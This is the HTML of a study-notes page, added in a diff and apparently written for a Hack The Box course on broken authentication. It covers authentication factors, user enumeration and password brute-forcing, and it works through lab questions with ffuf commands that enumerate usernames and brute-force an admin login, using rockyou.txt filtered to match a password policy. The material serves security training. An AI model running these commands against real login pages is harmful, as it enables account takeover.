+          <li class="md-nav__item">
+  <a href="#overview_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Overview
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#brute-force-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Brute-Force Attacks
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Brute-Force Attacks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#short-session-tokens" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Short session tokens
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#partially-random-tokens" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Partially random tokens
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sequential-session-tokens" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Sequential session tokens
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attacking-predictable-session-tokens" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attacking Predictable Session Tokens
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Attacking Predictable Session Tokens">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#base64-encoded-tokens" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Base64-encoded tokens
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hexadecimal-encoded-tokens" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Hexadecimal-Encoded Tokens
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-1_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📌 Question 1
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-2_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📌 Question 2
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#section-13" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Section 13
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Section 13">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#overview_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Overview
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#session-fixation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Session Fixation
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#improper-session-timeout" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Improper Session Timeout
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#section-14" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Section 14
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="file-inclusion">File Inclusion</h1>
+<p><span class="sn-pub-date" data-date="2026-09-31"></span> · <span class="sn-read-badge"></span></p>
+
+<h2 id="section-1">Section 1</h2>
+<h3 id="what-is-authentication">What is Authentication?</h3>
+<p><strong>Authentication</strong> is the process of verifying the identity of a user, system, or entity to confirm that they are who they claim to be.</p>
+<ul>
+<li>It is one of the <strong>first lines of defense</strong> against unauthorized access.</li>
+<li>The most common method in web applications is a <strong>login form</strong> using a username and password.</li>
+<li><strong>Examples:</strong><ul>
+<li>Email accounts</li>
+<li>Online banking</li>
+</ul>
+</li>
+</ul>
+<h3 id="authentication-vs-authorization">Authentication vs. Authorization</h3>
+<table>
+<thead>
+<tr>
+<th>Authentication</th>
+<th>Authorization</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Determines <strong>who you are</strong></td>
+<td>Determines <strong>what you can access</strong></td>
+</tr>
+<tr>
+<td>Verifies identity using credentials</td>
+<td>Checks permissions using policies and rules</td>
+</tr>
+<tr>
+<td>Usually happens before authorization</td>
+<td>Usually happens after authentication</td>
+</tr>
+<tr>
+<td>Requires login details or authentication factors</td>
+<td>Requires user privileges or permission levels</td>
+</tr>
+<tr>
+<td>May use an ID Token to communicate identity</td>
+<td>May use an Access Token to grant or represent access</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Example:</strong></p>
+<ul>
+<li><strong>Authentication</strong>: You log in to a website using your email and password.</li>
+<li><strong>Authorization</strong>: The website checks whether your account has permission to access the admin dashboard.</li>
+</ul>
+<p><strong>Key Difference:</strong> Authentication verifies identity; authorization determines access permissions.</p>
+<h3 id="common-authentication-methods">Common Authentication Methods</h3>
+<table>
+<thead>
+<tr>
+<th>Authentication Factor</th>
+<th>Description</th>
+<th>Examples</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Knowledge-Based</strong> Authentication</td>
+<td>Something you know</td>
+<td>Password, passphrase, PIN, answers to security questions</td>
+</tr>
+<tr>
+<td><strong>Ownership-Based</strong> Authentication</td>
+<td>Something you have or possess</td>
+<td>ID card, security token, smartphone with an authenticator app</td>
+</tr>
+<tr>
+<td><strong>Inherence-Based</strong> Authentication</td>
+<td>Something you are or do</td>
+<td>biometric factors (Fingerprint, facial recognition, voice recognition)</td>
+</tr>
+</tbody>
+</table>
+<h3 id="single-factor-authentication-sfa">Single-Factor Authentication (SFA)</h3>
+<p>Single-factor authentication relies on only one authentication factor to verify a user's identity.</p>
+<ul>
+<li>Example: Logging in using only a password.</li>
+<li>It relies on a single type of proof, such as knowledge of a password.</li>
+</ul>
+<h3 id="multi-factor-authentication-mfa">Multi-Factor Authentication (MFA)</h3>
+<p>Multi-factor authentication requires two or more authentication factors to verify a user's identity, MFA is commonly referred to as <strong>two-factor authentication (2FA)</strong>.</p>
+<ol>
+<li>Enter your password (<strong>something you know</strong>).</li>
+<li>Enter a Time-Based One-Time Password (TOTP) generated by an authenticator app (<strong>something you possess</strong>).</li>
+</ol>
+<p><strong>Important</strong>: Using two passwords does not count as MFA because both belong to the same category: something you know.</p>
+<h2 id="section-2">Section 2</h2>
+<h3 id="attacks-on-authentication">Attacks on Authentication</h3>
+<p>Authentication attacks can be categorized based on the <strong>three main authentication factors</strong>:</p>
+<ul>
+<li><strong>Knowledge-based</strong>: Something you know.</li>
+<li><strong>Ownership-based</strong>: Something you have.</li>
+<li><strong>Inherence-based</strong>: Something you are or do.</li>
+</ul>
+<p>Each type <strong>has different weaknesses and attack methods</strong>.</p>
+<h3 id="attacking-knowledge-based-authentication">Attacking Knowledge-Based Authentication</h3>
+<p>Knowledge-based authentication is widely used and comparatively easy to attack. It <strong>relies on static information that attackers may obtain, guess, or brute-force</strong>.</p>
+<p>Common weaknesses and attack methods:</p>
+<ul>
+<li><strong>Brute-force attacks</strong>: Repeatedly trying passwords or PINs <strong>until the correct one is found</strong>.</li>
+<li><strong>Guessing attacks</strong>: Using <strong>predictable</strong> passwords or personal information.</li>
+<li><strong>Social engineering</strong>: <strong>Tricking users</strong> into revealing their credentials.</li>
+<li><strong>Data breaches</strong>: <strong>Obtaining</strong> passwords or other sensitive information <strong>from compromised systems</strong>.</li>
+</ul>
+<h3 id="attacking-ownership-based-authentication">Attacking Ownership-Based Authentication</h3>
+<p>Ownership-based authentication relies on something the user possesses, such as hardware tokens, smart cards, or other physical devices.</p>
+<p><strong>Advantages:</strong></p>
+<ul>
+<li>More resistant to common phishing and password-guessing attacks.</li>
+<li>Physical objects are generally harder to acquire or replicate than information that can be guessed, phished, or stolen through data breaches.</li>
+</ul>
+<p><strong>Limitations:</strong></p>
+<ul>
+<li><strong>Cost and logistics</strong>: Purchasing, distributing, and managing physical tokens or devices can be expensive and complicated, especially in large-scale deployments.</li>
+<li><strong>Physical attacks</strong>: Attackers may steal or clone the authentication device (<strong>NFC Badge Cloning</strong>)</li>
+<li><strong>Cryptographic attacks</strong>: Attackers may exploit weaknesses in the cryptographic algorithms used by the authentication system.</li>
+</ul>
+<h3 id="attacking-inherence-based-authentication">Attacking Inherence-Based Authentication</h3>
+<p>Inherence-based authentication relies on biometric characteristics or behaviors, such as fingerprints, facial patterns, and other biometric data.</p>
+<p><strong>Advantages:</strong></p>
+<ul>
+<li>Convenient and user-friendly.</li>
+<li>Users do not need to remember complex passwords.</li>
+<li>Users do not need to carry physical authentication tokens.</li>
+<li>Can reduce risks associated with weak passwords or stolen tokens.</li>
+</ul>
+<p><strong>Weaknesses and concerns:</strong></p>
+<ul>
+<li><strong>Privacy risks</strong>: Biometric data is highly sensitive personal information.</li>
+<li><strong>Data security</strong>: Biometric databases must be securely protected.</li>
+<li><strong>Algorithmic bias</strong>: Biometric recognition algorithms may perform differently across individuals or groups.</li>
+<li><strong>Irreversible compromise</strong>: Unlike passwords, biometric characteristics generally cannot be changed if exposed.</li>
+</ul>
+<h3 id="example-biostar-2-data-breach-2019">Example: BioStar 2 Data Breach (2019)</h3>
+<p>In 2019, attackers breached a company that developed biometric smart-lock systems managed through mobile and web applications.</p>
+<p>The systems used fingerprints and facial patterns to identify authorized users.</p>
+<p><strong>Information exposed included:</strong></p>
+<ul>
+<li>Fingerprints</li>
+<li>Facial patterns</li>
+<li>Usernames and passwords</li>
+<li>Access grants and permissions</li>
+<li>Registered users' addresses</li>
+</ul>
+<p><strong>Why was this serious?</strong></p>
+<ol>
+<li>The attackers obtained sensitive biometric and account information.</li>
+<li>Affected users could change their passwords to reduce the risk of further account compromise.</li>
+<li>However, users could not simply change their fingerprints or facial characteristics.</li>
+<li>Therefore, compromised biometric data could create a long-term security and privacy risk.</li>
+</ol>
+<p><strong>Source:</strong> <a href="https://www.vpnmentor.com/blog/report-biostar2-leak">BioStar 2 Biometric Data Breach Report</a></p>
+<h3 id="quick-comparison-of-authentication-attacks">Quick Comparison of Authentication Attacks</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">Authentication Type</th>
+<th style="text-align: center;">Main Weaknesses</th>
+<th style="text-align: center;">Common Attack Methods</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">Knowledge-Based</td>
+<td style="text-align: center;">Static information can be guessed, stolen, or obtained</td>
+<td style="text-align: center;">Brute force, password guessing, social engineering, data breaches</td>
+</tr>
+<tr>
+<td style="text-align: center;">Ownership-Based</td>
+<td style="text-align: center;">Physical devices can be stolen or cloned; cryptographic weaknesses may exist</td>
+<td style="text-align: center;">Theft, badge cloning, cryptographic attacks</td>
+</tr>
+<tr>
+<td style="text-align: center;">Inherence-Based</td>
+<td style="text-align: center;">Sensitive biometric data can be exposed and is difficult to replace</td>
+<td style="text-align: center;">Biometric data breaches, attacks exploiting recognition-system weaknesses</td>
+</tr>
+</tbody>
+</table>
+<h2 id="section-3">Section 3</h2>
+<h3 id="what-is-user-enumeration">What is User Enumeration?</h3>
+<p>User enumeration is a vulnerability that allows attackers to identify valid usernames or registered accounts <strong>by observing differences in a web application's behavior</strong>.</p>
+<ul>
+<li>
+<p><strong>Commonly occurs in:</strong></p>
+<ul>
+<li>Login forms</li>
+<li>Registration pages</li>
+<li>Password reset functionality</li>
+</ul>
+</li>
+<li>
+<p><strong>Usernames may be sensitive</strong> because:</p>
+<ul>
+<li>They can be required for authentication.</li>
+<li>Users often reuse the same username across multiple services, such as web applications, FTP, RDP, and SSH.</li>
+</ul>
+</li>
+</ul>
+<h3 id="user-enumeration-theory">User Enumeration Theory</h3>
+<p>User enumeration creates a balance between security and user experience.</p>
+<ul>
+<li>Revealing whether a username exists helps legitimate users identify typing mistakes.</li>
+<li>However, attackers can use the same information to discover valid accounts.</li>
+<li>Even mature applications, such as <strong>WordPress, may reveal username validity by default</strong>.</li>
+</ul>
+<p><strong>Example: WordPress Login</strong></p>
+<table>
+<thead>
+<tr>
+<th>Input</th>
+<th>Error Message</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Invalid username</td>
+<td><code>Unknown username. Check again or try your email address.</code></td>
+<td>Username does not exist</td>
+</tr>
+<tr>
+<td>Valid username + wrong password</td>
+<td><code>The password you entered for the username editor is incorrect.</code></td>
+<td>Username exists</td>
+</tr>
+</tbody>
+</table>
+<details class="note">
+<summary>Important: User enumeration is not always a vulnerability</summary>
+<p><center><strong>Some applications, such as chat platforms, need username searches to help users find each other.</strong></center>
+<center><strong>One possible approach is to use email addresses for login instead of usernames</strong>, although this alone does not prevent enumeration if the application still reveals account validity.</center></p>
+</details>
+<h3 id="user-enumeration-via-differing-error-messages">User Enumeration via Differing Error Messages</h3>
+<p>Attackers can discover valid usernames by <strong>submitting different usernames and analyzing the application's responses</strong>.</p>
+<p><strong>Common sources of usernames:</strong></p>
+<ul>
+<li>Username wordlists.</li>
+<li>Crawling a web application.</li>
+<li>Public company profiles on social networks.</li>
+<li>OSINT (Open-Source Intelligence).</li>
+<li>Publicly available information about employees and users.</li>
+</ul>
+<p><strong>Recommended wordlist collection</strong>: <a href="https://github.com/danielmiessler/SecLists/tree/master/Usernames">SecLists — Usernames</a></p>
+<p><strong>Example: Login Responses</strong></p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">Username</th>
+<th style="text-align: center;">Password</th>
+<th style="text-align: center;">Response</th>
+<th style="text-align: center;">Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;"><code>abc</code></td>
+<td style="text-align: center;"><code>invalid</code></td>
+<td style="text-align: center;"><code>Unknown user</code></td>
+<td style="text-align: center;">Invalid username</td>
+</tr>
+<tr>
+<td style="text-align: center;"><code>htb-stdnt</code></td>
+<td style="text-align: center;"><code>invalid</code></td>
+<td style="text-align: center;"><code>Invalid credentials</code></td>
+<td style="text-align: center;">Potentially valid username</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Enumerating Users with FFUF</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>ffuf<span class="w"> </span>-w<span class="w"> </span>/opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>-u<span class="w"> </span>http://172.17.0.2/index.php<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>-H<span class="w"> </span><span class="s2">"Content-Type: application/x-www-form-urlencoded"</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>-d<span class="w"> </span><span class="s2">"username=FUZZ&amp;password=invalid"</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>-fr<span class="w"> </span><span class="s2">"Unknown user"</span>
+</span></code></pre></div></p>
+<p><strong>Command breakdown:</strong></p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">Parameter</th>
+<th style="text-align: center;">Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;"><code>-w</code></td>
+<td style="text-align: center;">Specifies the username wordlist</td>
+</tr>
+<tr>
+<td style="text-align: center;"><code>-u</code></td>
+<td style="text-align: center;">Specifies the target URL</td>
+</tr>
+<tr>
+<td style="text-align: center;"><code>-X POST</code></td>
+<td style="text-align: center;">Sends POST requests</td>
+</tr>
+<tr>
+<td style="text-align: center;"><code>-H</code></td>
+<td style="text-align: center;">Sets the HTTP request header</td>
+</tr>
+<tr>
+<td style="text-align: center;"><code>-d</code></td>
+<td style="text-align: center;">Specifies the POST request body</td>
+</tr>
+<tr>
+<td style="text-align: center;"><code>FUZZ</code></td>
+<td style="text-align: center;">Marks the username value to replace with each wordlist entry</td>
+</tr>
+<tr>
+<td style="text-align: center;"><code>-fr "Unknown user"</code></td>
+<td style="text-align: center;">Filters out responses containing <code>Unknown user</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Analyze the results</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>[Status: 200, Size: 3271, Words: 754, Lines: 103]
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>FUZZ: consuelo
+</span></code></pre></div>
+<p><strong><code>consuelo</code></strong> is identified as a potentially valid username because its response does not contain <strong><code>Unknown user</code></strong>.</p>
+<h3 id="user-enumeration-via-side-channel-attacks">User Enumeration via Side-Channel Attacks</h3>
+<p>A <strong>side-channel attack</strong> identifies users through indirect information about application behavior, rather than explicit differences in response messages by <strong>response timing</strong>.</p>
+<p><strong>How it works:</strong></p>
+<ol>
+<li>Submit a login request with a candidate username.</li>
+<li>Measure the response time.</li>
+<li>Repeat the test to account for normal timing variations.</li>
+<li>Compare response-time patterns for different usernames.</li>
+<li>Determine whether valid and invalid usernames produce consistently different timings.</li>
+</ol>
+<p>Example:</p>
+<table>
+<thead>
+<tr>
+<th>Username Type</th>
+<th>Application Behavior</th>
+<th>Possible Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Invalid username</td>
+<td>Application rejects the request without querying additional user data</td>
+<td><strong>Faster response</strong></td>
+</tr>
+<tr>
+<td>Valid username</td>
+<td>Application performs a database lookup or password verification</td>
+<td><strong>Slower response</strong></td>
+</tr>
+</tbody>
+</table>
+<p>If the <strong>timing difference</strong> is consistent and statistically meaningful, <strong>it may reveal valid usernames even when the error messages are identical</strong>.</p>
+<details class="warning">
+<summary>Warning</summary>
+<p><center><strong>Timing differences are not guaranteed; network latency, caching, and other application processes can affect measurements.</strong></center></p>
+</details>
+<h3 id="question">📌 Question</h3>
+<p><strong>Step 1: Identify Different Responses Based on Usernames</strong></p>
+<ol>
+<li>Try a valid username, <code>htb-stdnt</code>, with a wrong password, <code>123456</code>.<ul>
+<li>Response: <code>Invalid credentials.</code></li>
+</ul>
+</li>
+<li>Try an invalid username, <code>Bavly</code>, with the same wrong password, <code>123456</code>.<ul>
+<li>Response: <code>Unknown user.</code></li>
+</ul>
+</li>
+</ol>
+<p><strong>Step 2: Capture the Login Request Headers</strong></p>
+<ol>
+<li>Open the browser's Developer Tools (<code>F12</code>).</li>
+<li>Navigate to the <strong>Network</strong> tab.</li>
+<li>Submit a login attempt with any username and password.</li>
+<li>Select the login request and inspect its <strong>Headers</strong> and <strong>Payload</strong>.</li>
+<li>Note the request URL, HTTP method, <code>Content-Type</code>, and POST parameters.</li>
+</ol>
+<p><img alt="Q in Section3" src="Q in Section3.png" /></p>
+<p><strong>Step 3: Enumerate Valid Usernames Using FFUF</strong></p>
+<p>Run FFUF with a username wordlist and filter out responses containing <code>Unknown user</code>.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>ffuf<span class="w"> </span>-w<span class="w"> </span>/opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>-u<span class="w"> </span>http://154.57.164.83:44771/index.php<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>-H<span class="w"> </span><span class="s2">"Content-Type: application/x-www-form-urlencoded"</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>-d<span class="w"> </span><span class="s2">"username=FUZZ&amp;password=invalid"</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>-fr<span class="w"> </span><span class="s2">"Unknown user"</span>
+</span></code></pre></div>
+<p><strong>Result</strong>
+<img alt="Result Q in Section3" src="Result Q in Section3.png" /></p>
+<h2 id="section-4">Section 4</h2>
+<h3 id="understanding-password-brute-forcing">Understanding Password Brute-Forcing</h3>
+<p>Password brute-forcing is an attack that automatically tries multiple passwords until the correct one is found.</p>
+<p><strong>Common password security weaknesses include:</strong></p>
+<ul>
+<li><strong>Password Reuse (prominent issue)</strong>: Using the same password across multiple accounts. Attackers may try leaked passwords against other services, which is related to credential stuffing.</li>
+<li><strong>Weak Passwords</strong>: Using common words, predictable phrases, or simple patterns.</li>
+<li><strong>Password Spraying</strong>: Trying a small number of common passwords against multiple accounts <strong>to reduce the risk of account lockouts</strong>.</li>
+</ul>
+<details class="note">
+<summary>Note</summary>
+<p><center><strong>The success of brute-forcing depends on the number of attempts allowed, the time required, and the quality of the wordlist.</strong></center></p>
+</details>
+<h3 id="create-a-custom-password-wordlist">Create a Custom Password Wordlist</h3>
+<p>Before brute-forcing, check the application's password policy. In this example, passwords must contain:</p>
+<ul>
+<li>At least one uppercase letter (<code>A-Z</code>).</li>
+<li>At least one lowercase letter (<code>a-z</code>).</li>
+<li>At least one digit (<code>0-9</code>).</li>
+<li>At least 10 characters.</li>
+</ul>
+<p>The <code>rockyou.txt</code> wordlist contains approximately 14.3 million passwords.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>wc<span class="w"> </span>-l<span class="w"> </span>/opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
+</span></code></pre></div>
+<h4 id="method-1-using-grep">Method 1: Using <code>grep</code></h4>
+<p><strong>Filter passwords to match the application's policy:</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>grep<span class="w"> </span><span class="s1">'[[:upper:]]'</span><span class="w"> </span>/opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s1">'[[:lower:]]'</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s1">'[[:digit:]]'</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">'.{10}'</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>&gt;<span class="w"> </span>custom_wordlist.txt
+</span></code></pre></div>
+<p><strong>Check the resulting wordlist size:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>wc -l custom_wordlist.txt
+</span></code></pre></div>
+<p><strong>Expected output from the example:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>151647 custom_wordlist.txt
+</span></code></pre></div>
+<p>This reduces the wordlist by approximately <strong>99%</strong>.</p>
+<h4 id="method-2-using-awk">Method 2: Using <code>awk</code></h4>
+<p>The same filtering can be performed with a single command:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>awk 'length($0) &gt;= 10 &amp;&amp; /[a-z]/ &amp;&amp; /[A-Z]/ &amp;&amp; /[0-9]/' \
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>/opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt \
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>&gt; custom_wordlist.txt
+</span></code></pre></div>
+<h3 id="brute-force-the-password-with-ffuf">Brute-Force the Password with FFUF</h3>
+<p>Use <code>FUZZ</code> as the placeholder for each candidate password in the custom wordlist.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>ffuf -w ./custom_wordlist.txt \
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>-u http://172.17.0.2/index.php \
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>-X POST \
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>-H "Content-Type: application/x-www-form-urlencoded" \
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>-d "username=admin&amp;password=FUZZ" \
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>-fr "Invalid username"
+</span></code></pre></div>
+<h3 id="question-1">📌 Question 1</h3>
+<p><img alt="Q1 in Section4" src="Q1 in Section4.png" /></p>
+<h3 id="question-2">📌 Question 2</h3>
+<p><strong>Step 1: Create a Custom Wordlist</strong></p>
+<p>The application requires passwords to contain at least one uppercase letter, one lowercase letter, one digit, and a minimum of 10 characters.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>awk<span class="w"> </span><span class="s1">'length($0) &gt;= 10 &amp;&amp; /[a-z]/ &amp;&amp; /[A-Z]/ &amp;&amp; /[0-9]/'</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>/opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>&gt;<span class="w"> </span>custom_wordlist.txt
+</span></code></pre></div>
+<p><strong>Step 2: Capture the Login Request</strong></p>
+<ol>
+<li>Open Developer Tools using <code>F12</code>.</li>
+<li>Navigate to the <strong>Network</strong> tab.</li>
+<li>Submit a login attempt.</li>
+<li>Select the login request.</li>
+<li>Inspect the request URL, HTTP method, <code>Content-Type</code>, and POST parameters.</li>
+</ol>
+<p><img alt="Q2 in Section4" src="Q2 in Section4.png" /></p>
+<p><strong>Step 3: Brute-Force the Admin Password</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>ffuf<span class="w"> </span>-w<span class="w"> </span>./custom_wordlist.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>-u<span class="w"> </span>http://154.57.164.78:34275/index.php<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>-H<span class="w"> </span><span class="s2">"Content-Type: application/x-www-form-urlencoded"</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>-d<span class="w"> </span><span class="s2">"username=admin&amp;password=FUZZ"</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>-fr<span class="w"> </span><span class="s2">"Invalid username or password"</span>
+</span></code></pre></div>
+<p><strong>Result</strong>
+<img alt="Result Q2 in Section4" src="Result Q2 in Section4.png" /></p>
+<h2 id="section-5">Section 5</h2>
+<h3 id="understanding-password-reset-tokens">Understanding Password Reset Tokens</h3>
+<p>Password reset functionality allows users to recover accounts when they forget their passwords. Applications commonly generate a one-time token and send it through email or SMS.</p>
+<p>A typical password reset flow:</p>
+<ol>
+<li>The user requests a password reset.</li>
+<li>The application generates a reset token.</li>
+<li>The user receives the token through email or SMS.</li>
+<li>The user submits the token to verify the reset request.</li>
+<li>The application allows the user to set a new password.</li>
+</ol>
+<p>Weak reset tokens can be guessed or brute-forced, potentially allowing unauthorized password resets and account takeover.</p>
